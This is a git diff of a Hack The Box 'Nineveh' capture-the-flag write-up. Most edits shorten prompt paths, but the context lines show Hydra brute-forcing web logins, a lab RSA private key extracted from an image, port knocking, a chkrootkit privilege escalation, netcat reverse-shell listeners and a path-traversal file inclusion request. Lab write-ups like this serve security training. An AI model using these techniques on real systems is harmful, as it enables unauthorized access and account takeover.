@@ -9,6 +9,8 @@ categories:
 tags:
   - HTB-Medium
   - Linux
+  - Hydra
+  - Loca file inclusion
   - Knockd
   - phpLiteAdmin
   - Steganography
@@ -38,7 +40,7 @@ tags:
 ## Open ports
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.43
+luc@kali:~/HTB/Nineveh$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.43
 ```
 
 |Port|Service|Version
@@ -63,7 +65,7 @@ We get different pages when browsing `http://nineveh.htb` and `https://nineveh.h
 ### HTTP
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh$ gobuster dir -u http://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
+luc@kali:~/HTB/Nineveh$ gobuster dir -u http://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
 ...
 /department (Status: 301)
 ...
@@ -74,7 +76,7 @@ Navigating to `http://nineveh.htb/department` shows a login page
 ### HTTPS
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh$ gobuster dir -u https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
+luc@kali:~/HTB/Nineveh$ gobuster dir -u https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
 ...
 /db (Status: 301)
 ...
@@ -93,7 +95,7 @@ Navigating to `https://nineveh.htb/secure_notes` shows an image.
 We don't have any credentials so we'll need to brute force this login. Using username `admin` and password `admin` shows the message `Invalid Password!` and username `FakeUser` shows the message `invalid username`.
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh$ hydra nineveh.htb http-form-post "/department/login.php:username=^USER^&password=^PASS^:Invalid Password" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+luc@kali:~/HTB/Nineveh$ hydra nineveh.htb http-form-post "/department/login.php:username=^USER^&password=^PASS^:Invalid Password" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
 ...
 [80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
 ...
@@ -179,15 +181,15 @@ This email could be a reference to [Port Knocking](https://wiki.archlinux.org/in
 This image probably hides some important information so we'll need to download it.
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh$ mkdir images
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh$ cd images/
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh/images$ wget https://nineveh.htb/secure_notes/nineveh.png --no-check-certificate
+luc@kali:~/HTB/Nineveh$ mkdir images
+luc@kali:~/HTB/Nineveh$ cd images/
+luc@kali:~/HTB/Nineveh/images$ wget https://nineveh.htb/secure_notes/nineveh.png --no-check-certificate
 ```
 
 We can use the `strings` command to see if there is any hidden text data in the image
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh/images$ strings nineveh.png
+luc@kali:~/HTB/Nineveh/images$ strings nineveh.png
 ...
 -----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
@@ -224,7 +226,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0nd
 This looks like the private SSH key for `amrois@nineveh.htb`, we can try using this key to login.
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh/images$ echo -n '-----BEGIN RSA PRIVATE KEY-----
+luc@kali:~/HTB/Nineveh/images$ echo -n '-----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
 H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
 PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
@@ -251,16 +253,16 @@ i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
 il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
 fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
 -----END RSA PRIVATE KEY-----' > amrois.key
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh/images$ chmod 600 amrois.key
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh/images$ ssh -i amrois.key amrois@nineveh.htb
+luc@kali:~/HTB/Nineveh/images$ chmod 600 amrois.key
+luc@kali:~/HTB/Nineveh/images$ ssh -i amrois.key amrois@nineveh.htb
 ssh: connect to host nineveh.htb port 22: Connection timed out
 ```
 
 As expected the SSH port is closed (otherwise it would have shown as open during the NMAP scan). We'll probably need the port knocking sequence we found earlier in `/var/mail/amrois`, `571` `290` `911`.
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh/images$ knock 10.10.10.43 571:tcp 290:tcp 911:tcp
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh/images$ ssh -i amrois.key amrois@10.10.10.43
+luc@kali:~/HTB/Nineveh/images$ knock 10.10.10.43 571:tcp 290:tcp 911:tcp
+luc@kali:~/HTB/Nineveh/images$ ssh -i amrois.key amrois@10.10.10.43
 amrois@nineveh:~$ cat user.txt
 82a864f*************************
 ```
@@ -268,8 +270,8 @@ amrois@nineveh:~$ cat user.txt
 ## Privilege escalation
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh$ cp /opt/pspy-binaries/pspy32 .
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh$ python3 -m http.server
+luc@kali:~/HTB/Nineveh$ cp /opt/pspy-binaries/pspy32 .
+luc@kali:~/HTB/Nineveh$ python3 -m http.server
 ```
 
 ```bash
@@ -284,7 +286,7 @@ CMD: UID=0    PID=11138  | /bin/sh /usr/bin/chkrootkit
 Chkrootkit is executed as root and this application has a known privilege escalation
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh$ searchsploit chkrootkit
+luc@kali:~/HTB/Nineveh$ searchsploit chkrootkit
 ...
 Chkrootkit 0.49 - Local Privilege Escalation | linux/local/33899.txt
 ...
@@ -300,7 +302,7 @@ amrois@nineveh:/tmp$ chmod +x update
 ```
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh$ sudo nc -lnvp 443
+luc@kali:~/HTB/Nineveh$ sudo nc -lnvp 443
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::443
 Ncat: Listening on 0.0.0.0:443
@@ -360,7 +362,7 @@ This solution found, but ignored phpLiteAdmin because another solution was found
 We'll use Hydra to brute force the login tot phpLiteAdmin, just like we did to the department login page. The hydra command will have `-l user`, because we have to set the `-l` parameter even when it's not used.
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh$ hydra nineveh.htb https-form-post "/db/index.php:password=^PASS^&proc_login=true:Incorrect password" -l user -P /usr/share/wordlists/rockyou.txt -vV -f
+luc@kali:~/HTB/Nineveh$ hydra nineveh.htb https-form-post "/db/index.php:password=^PASS^&proc_login=true:Incorrect password" -l user -P /usr/share/wordlists/rockyou.txt -vV -f
 ...
 [443][http-post-form] host: nineveh.htb   login: user   password: password123
 ...
@@ -400,7 +402,7 @@ GET /department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/sh
 ```
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh$ sudo nc -lnvp 444
+luc@kali:~/HTB/Nineveh$ sudo nc -lnvp 444
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::444
 Ncat: Listening on 0.0.0.0:444
@@ -418,10 +420,10 @@ This `www-data` user also could've done the privilege escalation by placing the 
 Instead of manually looking trough the output of the strings command on the image we could've used Binwalk with the `-Me` parameters. `M` to recursively scan extracted files and `e` to extract files.
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Nineveh/images$ binwalk -Me nineveh.png
+luc@kali:~/HTB/Nineveh/images$ binwalk -Me nineveh.png
 
 Scan Time:     2020-06-11 15:46:46
-Target File:   /home/luc/Documents/Cyber-security/HTB/Nineveh/images/nineveh.png
+Target File:   /home/luc/HTB/Nineveh/images/nineveh.png
 MD5 Checksum:  353b8f5a4578e4472c686b6e1f15c808
 Signatures:    391
 
@@ -433,7 +435,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
 
 Scan Time:     2020-06-11 15:46:46
-Target File:   /home/luc/Documents/Cyber-security/HTB/Nineveh/images/_nineveh.png.extracted/54
+Target File:   /home/luc/HTB/Nineveh/images/_nineveh.png.extracted/54
 MD5 Checksum:  d41d8cd98f00b204e9800998ecf8427e
 Signatures:    391
 
@@ -442,7 +444,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
 
 Scan Time:     2020-06-11 15:46:46
-Target File:   /home/luc/Documents/Cyber-security/HTB/Nineveh/images/_nineveh.png.extracted/secret/nineveh.priv
+Target File:   /home/luc/HTB/Nineveh/images/_nineveh.png.extracted/secret/nineveh.priv
 MD5 Checksum:  f426d661f94b16292efc810ebb7ea305
 Signatures:    391
 
@@ -452,7 +454,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
 
 Scan Time:     2020-06-11 15:46:46
-Target File:   /home/luc/Documents/Cyber-security/HTB/Nineveh/images/_nineveh.png.extracted/secret/nineveh.pub
+Target File:   /home/luc/HTB/Nineveh/images/_nineveh.png.extracted/secret/nineveh.pub
 MD5 Checksum:  6b60618d207ad97e76664174e805cfda
 Signatures:    391
 
